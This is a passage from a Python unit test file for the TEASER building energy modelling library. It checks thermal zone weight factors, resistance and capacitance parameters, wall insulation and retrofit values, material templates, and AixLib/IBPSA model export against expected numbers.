           0.423320678280269,\n            0.03047939672771178,\n            0.0,\n            0.04267115541879649,\n            0.04267115541879649,\n        ]\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n\n        weightfactors_test_list = [\n            0.44444444444444453,\n            0.0,\n            0.0,\n            0.0,\n            0.2777777777777778,\n            0.2777777777777778,\n        ]\n\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win.sort() == weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_ground == 0.4303782174267145\n\n    def test_calc_weightfactor_two(self):\n        \"\"\"test of calc_weightfactor\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=2, merge_windows=True, used_library=\"IBPSA\"\n        )\n\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0.0,\n            0.024530650180761254,\n            0.03434291025306576,\n            0.024530650180761254,\n            0.03434291025306576,\n            0.3407000330729792,\n        ]\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n        weightfactors_test_list = [\n            0.0,\n            0.0,\n            0.054214642472656345,\n            0.08674342795625017,\n            0.054214642472656345,\n            0.0,\n        ]\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0.34638013315780397\n\n        prj.buildings[-1].thermal_zones[-1].weightfactor_ow = []\n        prj.buildings[-1].thermal_zones[-1].weightfactor_win = []\n\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=2, merge_windows=False, used_library=\"AixLib\"\n        )\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0.0,\n            0.03047939672771178,\n            0.04267115541879649,\n            0.03047939672771178,\n            0.04267115541879649,\n            0.423320678280269,\n        ]\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n\n        weightfactors_test_list = [\n            0.0,\n            0.0,\n            0.27777777777777778,\n            0.44444444444444453,\n            0.27777777777777778,\n            0.0,\n        ]\n\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0.4303782174267145\n\n    def test_calc_weightfactor_three(self):\n        \"\"\"test of calc_weightfactor\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=3, merge_windows=True, used_library=\"IBPSA\"\n        )\n\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n        weightfactors_test_list = [\n            0.03753045374718346,\n            0.5212510365068732,\n            0.05254263524605685,\n            0.03753045374718346,\n            0.05254263524605685,\n        ]\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n        weightfactors_test_list = [\n            0.13271234911406493,\n            0.0,\n            0.08294521819629057,\n            0.0,\n            0.08294521819629057,\n        ]\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0\n\n        prj.buildings[-1].thermal_zones[-1].weightfactor_ow = []\n        prj.buildings[-1].thermal_zones[-1].weightfactor_win = []\n\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=3, merge_windows=False, used_library=\"AixLib\"\n        )\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0.05350813058801943,\n            0.7431609731775066,\n            0.07491138282322722,\n            0.05350813058801943,\n            0.07491138282322722,\n        ]\n\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n\n        weightfactors_test_list = [\n            0.44444444444444453,\n            0.0,\n            0.2777777777777778,\n            0.0,\n            0.2777777777777778,\n        ]\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0\n\n    def test_calc_weightfactor_four(self):\n        \"\"\"test of calc_weightfactor\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=4, merge_windows=True, used_library=\"IBPSA\"\n        )\n\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0.07839276240589141,\n            0.10974986736824797,\n            0.07839276240589141,\n            0.10974986736824797,\n        ]\n\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n        weightfactors_test_list = [\n            0.27720655131187616,\n            0.17325409456992255,\n            0.0,\n            0.17325409456992255,\n        ]\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0\n        assert calc_attr.weightfactor_rt == [1]\n\n        prj.buildings[-1].thermal_zones[-1].weightfactor_ow = []\n        prj.buildings[-1].thermal_zones[-1].weightfactor_win = []\n\n        prj.buildings[-1].calc_building_parameter(\n            number_of_elements=4, merge_windows=False, used_library=\"AixLib\"\n        )\n        calc_attr = prj.buildings[-1].thermal_zones[-1].model_attr\n\n        weightfactors_test_list = [\n            0.20833333333333331,\n            0.29166666666666663,\n            0.20833333333333331,\n            0.29166666666666663,\n        ]\n        calc_attr.weightfactor_ow.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_ow == weightfactors_test_list\n\n        weightfactors_test_list = [\n            0.44444444444444453,\n            0.2777777777777778,\n            0.0,\n            0.2777777777777778,\n        ]\n\n        calc_attr.weightfactor_win.sort()\n        weightfactors_test_list.sort()\n        assert calc_attr.weightfactor_win == weightfactors_test_list\n        assert calc_attr.weightfactor_ground == 0\n        assert calc_attr.weightfactor_rt == [1]\n\n    def test_calc_one_element(self):\n        \"\"\"test of calc_two_element\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=1, merge_windows=True)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 328.0\n        assert round(zone_attr.ua_value_ow, 16) == 135.5818558809656\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.0016512549537649\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.000609756097561\n\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.000265957\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.84634\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_ow, 15) == 0.000772773294534\n        assert round(zone_attr.c1_ow, 5) == 3648580.59312\n        assert round(zone_attr.r_rest_ow, 14) == 0.00461875570532\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=1, merge_windows=False)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 328.0\n        assert round(zone_attr.ua_value_ow, 16) == 135.5818558809656\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.0016512549537649\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.000609756097561\n\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.000265957\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.84634\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_win, 13) == 0.0199004975124\n        assert round(zone_attr.r1_ow, 15) == 0.001007515484109\n        assert round(zone_attr.c1_ow, 5) == 3648580.59312\n        assert round(zone_attr.r_rest_ow, 14) == 0.00585224061345\n\n    def test_calc_two_element(self):\n        \"\"\"test of calc_two_element\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=2, merge_windows=True)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 328.0\n        assert round(zone_attr.ua_value_ow, 16) == 135.5818558809656\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.0016512549537649\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.000609756097561\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.000265957\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.84634\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_ow, 15) == 0.000772773294534\n        assert round(zone_attr.c1_ow, 5) == 3648580.59312\n        assert round(zone_attr.r1_iw, 15) == 0.009719561140816\n        assert round(zone_attr.c1_iw, 5) == 319983.51874\n\n        assert round(zone_attr.r_rest_ow, 14) == 0.00461875570532\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=2, merge_windows=False)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 328.0\n        assert round(zone_attr.ua_value_ow, 16) == 135.5818558809656\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.0016512549537649\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.000609756097561\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.000265957\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.84634\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_win, 13) == 0.0199004975124\n        assert round(zone_attr.r1_ow, 15) == 0.001007515484109\n        assert round(zone_attr.c1_ow, 5) == 3648580.59312\n        assert round(zone_attr.r1_iw, 15) == 0.009719561140816\n        assert round(zone_attr.r_rest_ow, 14) == 0.00585224061345\n\n    def test_calc_three_element(self):\n        \"\"\"test of calc_two_element\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=3, merge_windows=True)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 188.0\n        assert round(zone_attr.ua_value_ow, 16) == 77.23037843150993\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.0027203482045702\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.001063829787234\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.000265957\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.95532\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_ow, 14) == 0.00114890338306\n        assert round(zone_attr.c1_ow, 5) == 2091259.60825\n        assert round(zone_attr.r1_iw, 15) == 0.009719561140816\n        assert round(zone_attr.c1_iw, 5) == 319983.51874\n        assert round(zone_attr.r_rest_ow, 11) == 0.00702003101\n        assert round(zone_attr.area_gf, 1) == 140.0\n        assert round(zone_attr.ua_value_gf, 16) == 58.351477449455686\n        assert round(zone_attr.r_conv_inner_gf, 16) == 0.0042016806722689\n        assert round(zone_attr.r_rad_inner_gf, 16) == 0.0014285714285714\n        assert round(zone_attr.alpha_conv_inner_gf, 5) == 1.7\n        assert round(zone_attr.alpha_rad_inner_gf, 1) == 5.0\n        assert round(zone_attr.r1_gf, 14) == 0.00236046484848\n        assert round(zone_attr.c1_gf, 5) == 1557320.98487\n        assert round(zone_attr.r_rest_gf, 13) == 0.0137109637229\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=3, merge_windows=False)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 188.0\n        assert round(zone_attr.ua_value_ow, 16) == 77.23037843150993\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.0027203482045702\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.001063829787234\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.000265957\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 1.95532\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_win, 13) == 0.0199004975124\n        assert round(zone_attr.r1_ow, 13) == 0.0017577929723\n        assert round(zone_attr.c1_ow, 5) == 2091259.60825\n        assert round(zone_attr.r1_iw, 15) == 0.009719561140816\n        assert round(zone_attr.c1_iw, 5) == 319983.51874\n        assert round(zone_attr.r_rest_ow, 13) == 0.0102102921341\n        assert round(zone_attr.area_gf, 1) == 140.0\n        assert round(zone_attr.ua_value_gf, 16) == 58.351477449455686\n        assert round(zone_attr.r_conv_inner_gf, 16) == 0.0042016806722689\n        assert round(zone_attr.r_rad_inner_gf, 16) == 0.0014285714285714\n        assert round(zone_attr.alpha_conv_inner_gf, 5) == 1.7\n        assert round(zone_attr.alpha_rad_inner_gf, 1) == 5.0\n        assert round(zone_attr.r1_gf, 14) == 0.00236046484848\n        assert round(zone_attr.c1_gf, 5) == 1557320.98487\n        assert round(zone_attr.r_rest_gf, 13) == 0.0137109637229\n\n    def test_calc_four_element(self):\n        \"\"\"test of calc_two_element\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=4, merge_windows=True)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 48.0\n        assert round(zone_attr.ua_value_ow, 16) == 19.83577523748189\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.007716049382716\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.0041666666666667\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.001041667\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 2.7\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_ow, 14) == 0.00223838915931\n        assert round(zone_attr.c1_ow, 5) == 533938.62338\n        assert round(zone_attr.r1_iw, 14) == 0.00971956114082\n        assert round(zone_attr.c1_iw, 5) == 319983.51874\n        assert round(zone_attr.r_rest_ow, 13) == 0.0138583242416\n        assert round(zone_attr.area_gf, 1) == 140.0\n        assert round(zone_attr.ua_value_gf, 16) == 58.351477449455686\n        assert round(zone_attr.r_conv_inner_gf, 16) == 0.0042016806722689\n        assert round(zone_attr.r_rad_inner_gf, 16) == 0.0014285714285714\n        assert round(zone_attr.alpha_conv_inner_gf, 5) == 1.7\n        assert round(zone_attr.alpha_rad_inner_gf, 1) == 5.0\n        assert round(zone_attr.r1_gf, 14) == 0.00236046484848\n        assert round(zone_attr.c1_gf, 5) == 1557320.98487\n        assert round(zone_attr.r_rest_gf, 13) == 0.0137109637229\n\n        assert round(zone_attr.area_rt, 1) == 140.0\n        assert round(zone_attr.ua_value_rt, 16) == 57.394603194028036\n        assert round(zone_attr.r_conv_inner_rt, 16) == 0.0042016806722689\n        assert round(zone_attr.r_rad_inner_rt, 16) == 0.0014285714285714\n        assert round(zone_attr.r_conv_outer_rt, 9) == 0.000357143\n        assert round(zone_attr.alpha_conv_inner_rt, 5) == 1.7\n        assert round(zone_attr.alpha_rad_inner_rt, 1) == 5.0\n        assert round(zone_attr.r1_rt, 14) == 0.00236046484848\n        assert round(zone_attr.c1_rt, 5) == 1557320.98487\n        assert round(zone_attr.r_rest_rt, 13) == 0.0137109637229\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.calc_zone_parameters(number_of_elements=4, merge_windows=False)\n\n        zone_attr = therm_zone.model_attr\n        assert round(zone_attr.area_ow, 1) == 48.0\n        assert round(zone_attr.ua_value_ow, 16) == 19.83577523748189\n        assert round(zone_attr.r_conv_inner_ow, 16) == 0.007716049382716\n        assert round(zone_attr.r_rad_inner_ow, 16) == 0.0041666666666667\n        assert round(zone_attr.r_conv_outer_ow, 9) == 0.001041667\n        assert round(zone_attr.alpha_conv_inner_ow, 5) == 2.7\n        assert round(zone_attr.alpha_rad_inner_ow, 1) == 5.0\n        assert round(zone_attr.r1_win, 13) == 0.0199004975124\n        assert round(zone_attr.r1_ow, 14) == 0.00688468914141\n        assert round(zone_attr.c1_ow, 5) == 533938.62338\n        assert round(zone_attr.r1_iw, 14) == 0.00971956114082\n        assert round(zone_attr.c1_iw, 5) == 319983.51874\n        assert round(zone_attr.r_rest_ow, 13) == 0.0399903108586\n\n        assert round(zone_attr.area_gf, 1) == 140.0\n        assert round(zone_attr.ua_value_gf, 16) == 58.351477449455686\n        assert round(zone_attr.r_conv_inner_gf, 16) == 0.0042016806722689\n        assert round(zone_attr.r_rad_inner_gf, 16) == 0.0014285714285714\n        assert round(zone_attr.alpha_conv_inner_gf, 5) == 1.7\n        assert round(zone_attr.alpha_rad_inner_gf, 1) == 5.0\n        assert round(zone_attr.r1_gf, 14) == 0.00236046484848\n        assert round(zone_attr.c1_gf, 5) == 1557320.98487\n        assert round(zone_attr.r_rest_gf, 13) == 0.0137109637229\n\n        assert round(zone_attr.area_rt, 1) == 140.0\n        assert round(zone_attr.ua_value_rt, 16) == 57.394603194028036\n        assert round(zone_attr.r_conv_inner_rt, 16) == 0.0042016806722689\n        assert round(zone_attr.r_rad_inner_rt, 16) == 0.0014285714285714\n        assert round(zone_attr.r_conv_outer_rt, 9) == 0.000357143\n        assert round(zone_attr.alpha_conv_inner_rt, 5) == 1.7\n        assert round(zone_attr.alpha_rad_inner_rt, 1) == 5.0\n        assert round(zone_attr.r1_rt, 14) == 0.00236046484848\n        assert round(zone_attr.c1_rt, 5) == 1557320.98487\n        assert round(zone_attr.r_rest_rt, 13) == 0.0137109637229\n\n    def test_volume_zone(self):\n        \"\"\"test of volume_zone\"\"\"\n\n        prj.buildings[-1].thermal_zones[-1].set_volume_zone()\n        assert prj.buildings[-1].thermal_zones[-1].volume == 490.0\n\n    def test_set_inner_wall_area(self):\n        \"\"\"test of set_inner_wall_area\"\"\"\n\n        prj.buildings[-1].thermal_zones[-1].set_inner_wall_area()\n        for wall in prj.buildings[-1].thermal_zones[-1].inner_walls:\n            assert round(wall.area, 16) == 11.951219512195122\n        # methods in BuildingElement\n\n    def test_ua_value(self):\n        \"\"\"test of ua_value\"\"\"\n        prj.set_default(load_data=True)\n        helptest.building_test2(prj)\n\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].calc_ua_value()\n\n        assert round(therm_zone.outer_walls[0].ua_value, 15) == 4.132453174475393\n\n    def test_gather_element_properties(self):\n        \"\"\"test of gather_element_properties\"\"\"\n        outerWalls = prj.buildings[-1].thermal_zones[-1].outer_walls[0]\n        number_of_layer, density, thermal_conduc, heat_capac, thickness = (\n            outerWalls.gather_element_properties()\n        )\n        assert number_of_layer == 2\n        assert (density == [5.0, 2.0]).all()\n        assert (thermal_conduc == [4.0, 2.0]).all()\n        assert (heat_capac == [0.48, 0.84]).all()\n        assert (thickness == [5.0, 2.0]).all()\n\n    def test_load_type_element(self):\n        \"\"\"test of load_type_element, no parameter checking\"\"\"\n\n        # test load function\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].load_type_element(1988, \"heavy\", prj.data)\n        therm_zone.inner_walls[0].load_type_element(1988, \"light\", prj.data)\n        therm_zone.windows[0].load_type_element(\n            1988, \"Kunststofffenster, Isolierverglasung\", prj.data\n        )\n\n    def test_save_type_element(self):\n        \"\"\"test of save_type_element, no parameter checking\"\"\"\n        import os\n\n        # test load function\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        path = os.path.join(utilities.get_default_path(), \"unitTestTB.json\")\n        prj.data.path_tb = path\n        prj.data.load_tb_binding()\n        therm_zone.outer_walls[0].save_type_element(data_class=prj.data)\n        therm_zone.inner_walls[0].save_type_element(data_class=prj.data)\n        therm_zone.windows[0].save_type_element(data_class=prj.data)\n\n    def test_delete_type_element(self):\n        \"\"\"test of save_type_element, no parameter checking\"\"\"\n        import os\n\n        # test load function\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        path = os.path.join(utilities.get_default_path(), \"unitTestTB.json\")\n        prj.data.path_tb = path\n        prj.data.load_tb_binding()\n        therm_zone.outer_walls[0].delete_type_element(data_class=prj.data)\n        therm_zone.inner_walls[0].delete_type_element(data_class=prj.data)\n        therm_zone.windows[0].delete_type_element(data_class=prj.data)\n\n    # methods in Wall\n\n    def test_calc_equivalent_res_wall(self):\n        \"\"\"test of calc_equivalent_res, wall\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n\n        therm_zone.outer_walls[0].calc_equivalent_res()\n\n        # parameters for outwall\n\n        assert round(therm_zone.outer_walls[0].c1, 6) == 111237.213205\n        assert round(therm_zone.outer_walls[0].c2, 7) == 59455.3856787\n        assert round(therm_zone.outer_walls[0].r1, 13) == 0.0330465078788\n        assert round(therm_zone.outer_walls[0].r2, 13) == 0.0549256129353\n        assert round(therm_zone.outer_walls[0].r3, 12) == 0.137027879186\n        assert round(therm_zone.outer_walls[0].c1_korr, 6) == 111237.213205\n\n    def test_insulate_wall(self):\n        \"\"\"test of insulate_wall\"\"\"\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].insulate_wall(\"EPS_040_15\", 0.04)\n        assert round(therm_zone.outer_walls[0].ua_value, 6) == 2.924088\n\n    def test_retrofit_wall(self):\n        \"\"\"test of retrofit_wall\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].retrofit_wall(2016, \"EPS_040_15\")\n        assert round(therm_zone.outer_walls[0].ua_value, 6) == 2.4\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].retrofit_wall(2010, \"EPS_040_15\")\n        assert round(therm_zone.outer_walls[0].ua_value, 6) == 2.4\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].retrofit_wall(2005, \"EPS_040_15\")\n        assert round(therm_zone.outer_walls[0].ua_value, 2) == 4.13\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].retrofit_wall(1998, \"EPS_040_15\")\n        assert round(therm_zone.outer_walls[0].ua_value, 2) == 4.13\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].retrofit_wall(1990, \"EPS_040_15\")\n        assert round(therm_zone.outer_walls[0].ua_value, 2) == 4.13\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.outer_walls[0].retrofit_wall(1980, \"EPS_040_15\")\n        assert round(therm_zone.outer_walls[0].ua_value, 2) == 4.13\n\n    def test_calc_equivalent_res_win(self):\n        \"\"\"test of calc_equivalent_res, win\"\"\"\n        prj.set_default()\n        helptest.building_test2(prj)\n        therm_zone = prj.buildings[-1].thermal_zones[-1]\n        therm_zone.windows[0].calc_equivalent_res()\n\n        assert round(therm_zone.windows[0].r1, 3) == 0.072\n\n    def test_load_save_material(self):\n        \"\"\"test of load_material_template and save_material_template,\n        no parameter checking\"\"\"\n\n        from teaser.logic.buildingobjects.buildingphysics.material import Material\n\n        path = os.path.join(utilities.get_default_path(), \"MatUT.json\")\n\n        mat = Material(parent=None)\n        mat.load_material_template(mat_name=\"Tiledroof\", data_class=prj.data)\n\n        from teaser.data.dataclass import DataClass\n\n        dat = DataClass()\n        dat.path_mat = path\n        dat.load_mat_binding()\n\n        mat.save_material_template(data_class=dat)\n\n    def test_properties_project(self):\n        \"\"\"Tests properties of project class\"\"\"\n        prj.number_of_elements_calc\n        prj.merge_windows_calc\n        prj.used_library_calc\n        prj.name = 123\n        assert prj.name == \"P123\"\n\n    def test_warnings_prj(self):\n        \"\"\"Tests misc parts in project.py\"\"\"\n\n        from teaser.logic.buildingobjects.building import Building\n        from teaser.logic.buildingobjects.thermalzone import ThermalZone\n        from teaser.logic.buildingobjects.useconditions import UseConditions\n\n        # warnings for not calculated buildings\n        bld = Building(parent=prj)\n        tz = ThermalZone(parent=bld)\n        tz.use_conditions = UseConditions(parent=tz)\n        prj.calc_all_buildings()\n        prj.set_default(load_data=True)\n        # warning if iwu and number_of_apartments is used\n        prj.add_residential(\n            method=\"iwu\",\n            usage=\"single_family_dwelling\",\n            name=\"test\",\n            year_of_construction=1988,\n            number_of_floors=1,\n            height_of_floors=7,\n            net_leased_area=1988,\n            number_of_apartments=1,\n        )\n        # not all buildings if internal id is passed over\n        prj.add_residential(\n            method=\"iwu\",\n            usage=\"single_family_dwelling\",\n            name=\"test1\",\n            year_of_construction=1988,\n            number_of_floors=15,\n            height_of_floors=6,\n            net_leased_area=1988,\n        )\n        prj.calc_all_buildings()\n        prj.export_aixlib(internal_id=prj.buildings[-1].internal_id)\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa(internal_id=prj.buildings[-1].internal_id)\n\n        prj.set_default(load_data=\"Test\")\n\n    def test_export_aixlib_only_iw(self):\n        \"\"\"\n        Tests AixLib output for a building with inner walls only\n        \"\"\"\n\n        from teaser.logic.buildingobjects.building import Building\n\n        prj.set_default(load_data=True)\n\n        bldg = Building(parent=prj)\n        bldg.name = \"SuperExampleBuilding\"\n        bldg.street_name = \"AwesomeAvenue42\"\n        bldg.city = \"46325FantasticTown\"\n        bldg.year_of_construction = 2015\n        bldg.number_of_floors = 1\n        bldg.height_of_floors = 3.5\n\n        from teaser.logic.buildingobjects.thermalzone import ThermalZone\n\n        tz = ThermalZone(parent=bldg)\n        tz.name = \"LivingRoom\"\n        tz.area = 140.0\n        tz.volume = tz.area * bldg.number_of_floors * bldg.height_of_floors\n        tz.infiltration_rate = 0.5\n\n        from teaser.logic.buildingobjects.useconditions import UseConditions\n\n        tz.use_conditions = UseConditions(parent=tz)\n        tz.use_conditions.load_use_conditions(\"Living\", prj.data)\n\n        from teaser.logic.buildingobjects.buildingphysics.innerwall import InnerWall\n\n        in_wall_dict = {\n            \"InnerWall1\": [10.0],\n            \"InnerWall2\": [14.0],\n            \"InnerWall3\": [10.0],\n        }\n\n        for key, value in in_wall_dict.items():\n\n            in_wall = InnerWall(parent=tz)\n            in_wall.name = key\n            in_wall.load_type_element(\n                year=bldg.year_of_construction, construction=\"heavy\"\n            )\n            in_wall.area = value[0]\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n    def test_export_only_ow(self):\n        \"\"\"\n        Tests AixLib output for a building with outer walls only\n        \"\"\"\n\n        from teaser.logic.buildingobjects.building import Building\n\n        bldg = Building(parent=prj)\n        bldg.name = \"SuperExampleBuilding\"\n        bldg.street_name = \"AwesomeAvenue42\"\n        bldg.city = \"46325FantasticTown\"\n        bldg.year_of_construction = 2015\n        bldg.number_of_floors = 1\n        bldg.height_of_floors = 3.5\n\n        from teaser.logic.buildingobjects.thermalzone import ThermalZone\n\n        tz = ThermalZone(parent=bldg)\n        tz.name = \"LivingRoom\"\n        tz.area = 140.0\n        tz.volume = tz.area * bldg.number_of_floors * bldg.height_of_floors\n        tz.infiltration_rate = 0.5\n\n        from teaser.logic.buildingobjects.useconditions import UseConditions\n\n        tz.use_conditions = UseConditions(parent=tz)\n        tz.use_conditions.load_use_conditions(\"Living\", prj.data)\n\n        from teaser.logic.buildingobjects.buildingphysics.outerwall import OuterWall\n\n        out_wall_dict = {\n            \"OuterWall_north\": [10.0, 90.0, 0.0],\n            \"OuterWall_east\": [14.0, 90.0, 90.0],\n            \"OuterWall_south\": [10.0, 90.0, 180.0],\n            \"OuterWall_west\": [14.0, 90.0, 270.0],\n        }\n\n        for key, value in out_wall_dict.items():\n            out_wall = OuterWall(parent=tz)\n            out_wall.name = key\n\n            out_wall.load_type_element(\n                year=bldg.year_of_construction, 